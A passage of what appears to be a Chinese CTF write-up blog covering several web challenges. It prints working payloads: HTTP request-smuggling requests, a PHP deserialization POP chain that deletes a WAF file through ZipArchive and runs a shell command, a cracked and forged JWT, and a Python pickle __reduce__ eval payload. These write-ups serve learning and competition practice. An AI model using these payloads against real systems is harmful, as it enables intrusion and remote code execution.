<p><a href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/083cea019b778569ca28f634d3e4c46d.png"><img src="http%E8%B5%B0%E7%A7%81/083cea019b778569ca28f634d3e4c46d.png" alt="img"></a></p>
<p>像这个请求，尝试用两个TE去混淆，使得后端服务器不处理TE只处理CL，造成<code>TE-CL</code>的http走私</p>
<p>来自博客：<a href="http://www.shifeng-kaze.cn/index.php/archives/132/#%EF%BC%8C%E5%86%99%E7%9A%84%E7%9C%9F%E5%A5%BD%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AA%E5%81%9A%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BA%AA%E5%BF%B5">http://www.shifeng-kaze.cn/index.php/archives/132/#，写的真好，这里只做自己的纪念</a></p>
<p>Hgame两道题的Payload：</p>
<p>第一题：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret  HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">aa:bn</span></span><br></pre></td></tr></table></figure>





<p>第二题：</p>
<p>这题目和第一题是差不多一样的，只不过是作者为了防止蹭车设置了障碍，你得爆破</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret  HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">aa:bn</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br></pre></td></tr></table></figure>

<p>(最后两行的换行符是必需品)</p>
]]></content>
  </entry>
  <entry>
    <title>nepctf_梦里花开牡丹亭</title>
    <url>/2021/03/22/nepctf-%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD/</url>
    <content><![CDATA[<p>一道考点比较有趣的题目，虽然不难而且有点绕，但是感觉思路还是很精妙的！</p>
<p>首先打开题目可以看到源码：</p>
<h1 id="读取shell-php"><a href="#读取shell-php" class="headerlink" title="读取shell.php"></a>读取shell.php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;a&#x27;</span>]!==$_GET[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1($_GET[<span class="string">&#x27;a&#x27;</span>])=== sha1($_GET[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的最终目的是读取文件，所以需要利用到题目中给到的Open类中的open函数，查看哪里使用open函数，该题思路比较简单，就是</p>
<p>open-&gt;login-&gt;game 这三个类</p>
<p>首先第一步的绕过直接用数组绕过即可，这个简单，重点是反序列化我们，查POP链，一开始我以为是绕过wakeup函数，后来发现没法绕了（7.0+版本已消除了该问题），浪费了蛮多时间的，但是也没啥关系，我们直接走wakeup出发</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//            echo $this-&gt;content;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看到这里会先看我们的regiter的md5值,md5翻译出来就是admin，成功的话就会调用login，失败了就会去register，但是register没啥用，所以我们要保证能进入login当中，故第一步的payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Game();</span><br><span class="line">$a-&gt;register=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>接下来看login函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现login函数的checking函数会对用户名和密码进行检查，检查过后就会调用this-&gt;file的open函数，故我们需要构建：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$a-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$c = <span class="keyword">new</span> Open();</span><br><span class="line">$a-&gt;file = $c;</span><br></pre></td></tr></table></figure>

<p>再看Open函数做了什么</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现当没有waf.txt的时候便会执行shell函数：但是当前我们不知道shell.php的用法，如果有waf.txt则会读取文件，目前我们是有waf.txt的，所以可以读取文件，那么接着构造payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a-&gt;filename = <span class="string">&#x27;shell&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以读取到文件shell.php</p>
<p><img src="image-20210322110750049.png" alt="image-20210322110750049"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$cmd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,$cmd))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这就傻眼了，虽然这个绕过不难，但是我该怎么调用shell函数呢？这时再回头看，发现open函数如果没有找到waf.txt的话就会调用。。这就傻眼了，这怎么可能可以？</p>
<h1 id="删除waf-txt"><a href="#删除waf-txt" class="headerlink" title="删除waf.txt"></a>删除waf.txt</h1><p>这时候就要重新回顾题目了，题目调用到了open函数，但是我们可以猜想open函数难道只能用当前题目的Open类吗？是不是有其他内置类也有同名函数呢。所以上php官网去查找了一番，果然最终找到</p>
<p><img src="image-20210322110328291.png" alt="image-20210322110328291"></p>
<p><img src="image-20210322110418083.png" alt="image-20210322110418083"></p>
<p>那么这样就可以解决了，构造payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a-&gt;file=<span class="keyword">new</span> ZipArchive;</span><br><span class="line">$a-&gt;filename=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">$a-&gt;content = ZipArchive::OVERWRITE</span><br></pre></td></tr></table></figure>

<p>这样就可以删除掉文件</p>
<h1 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h1><p>这个就是最简单的一部了，直接php  /flag 即可，最终payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;new Game();</span><br><span class="line">$a-&gt;username&#x3D;&#39;admin&#39;;</span><br><span class="line">$a-&gt;password&#x3D;&#39;admin&#39;;</span><br><span class="line"></span><br><span class="line">$c&#x3D;new Open();</span><br><span class="line">$a-&gt;file&#x3D;$c;</span><br><span class="line">&#x2F;&#x2F;$c&#x3D;new Open();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;file&#x3D;new ZipArchive;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;ZipArchive::OVERWRITE;</span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">$a-&gt;filename&#x3D;&quot;waf.txt&quot;;</span><br><span class="line"></span><br><span class="line">$s&#x3D; (serialize($a));</span><br><span class="line">echo base64_encode($s);</span><br><span class="line">unserialize($s);</span><br></pre></td></tr></table></figure>

<p><img src="image-20210322110955960.png" alt="image-20210322110955960"></p>
<p>总结：</p>
<p>感觉这题目的思路挺好的，利用到了内置类的知识，相当有趣~（虽然做的时候呗绕来绕去</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>ikun</title>
    <url>/2020/12/06/ikun/</url>
    <content><![CDATA[<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><ol>
<li>Python逻辑漏洞</li>
<li>JWT伪造</li>
</ol>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>第一步，我们爆破找到LV6账号：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://25bf3014-fd74-4f4e-882b-5b310346732e.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>购买的时候多点几下触发打折，然后我们手动把折扣改的特别低</p>
<p><img src="image-20201206194646805.png" alt="image-20201206194646805"></p>
<p>得到url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b1g_m4mber</span><br></pre></td></tr></table></figure>

<p>需要我们用admin登陆，看看自己的情况，大概只能用JWT伪造了，没有密钥丢进去爆破好了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ysllz@kali:~/桌面/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个url下面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jwt.io&#x2F;</span><br></pre></td></tr></table></figure>

<p>编译之后得到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>

<p>之后去个人中心的邮箱地址下面给了个hint：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">邮箱地址：hint: \u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>

<p>得到这句话：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>把源码dump下来，在Admin.py当中我们可以找到触发点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>找了一篇写pickle的博客：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;article&#x2F;details&#x2F;79027055</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &#123;&#x27;foo&#x27;: [1,2,3],</span></span><br><span class="line"><span class="comment">#                 &#x27;bar&#x27;: (&#x27;Hello&#x27;, &#x27;world!&#x27;),</span></span><br><span class="line"><span class="comment">#                 &#x27;baz&#x27;: True&#125;</span></span><br><span class="line"><span class="comment"># jar = open(&#x27;data.pkl&#x27;, &#x27;wb&#x27;)</span></span><br><span class="line"><span class="comment"># pickle.dump(data, jar) # 将pickle后的数据写入jar文件</span></span><br><span class="line"><span class="comment"># jar.close()</span></span><br><span class="line"></span><br><span class="line">pkl_file = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = pickle.load(pkl_file)</span><br><span class="line">print(data)</span><br><span class="line">pkl_file.close()</span><br></pre></td></tr></table></figure>

<p>大概过程就这样，我们就可以读取文件了，但是很明显这不是我们想要的，因为我们的需要的是一个魔术方法，当我们的文件经过源码中的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br></pre></td></tr></table></figure>

<p>loads过程，或者说是urlib.unquote的时候会自动触发的魔术方法才可以</p>
<p>在官方文档中可以找到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">__reduce__(self)</span><br><span class="line">当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</span><br><span class="line"></span><br><span class="line">__reduce_ex__(self)</span><br><span class="line">__reduce_ex__ 的存在是为了兼容性。如果它被定义，在pickle时 __reduce_ex__ 会代替 __reduce__ 被调用。 __reduce__ 也可以被定义，用于不支持 __reduce_ex__ 的旧版pickle的API调用。</span><br></pre></td></tr></table></figure>

<p>在这里只能使用reduce这一魔术方法，因为仅仅有该魔术方法会告诉Python你的文件被pickle调用的时候该如何使用它…</p>
<p>故我们用该魔术方法生成payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span><span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>nepctf复现</title>
    <url>/2021/03/24/nepctf%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Little-trick"><a href="#Little-trick" class="headerlink" title="Little_trick"></a>Little_trick</h1><p>这道题目限制的很死，但是这种题目之前就做过了，可以通过写入文件的方式来读取flag的 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $nep = $_GET[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    $len = $_GET[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($len)&lt;<span class="number">8</span> &amp;&amp; strlen($nep)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($nep,<span class="number">0</span>,$len));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20210324191420028.png" alt="image-20210324191420028"></p>
<p>故通过：</p>
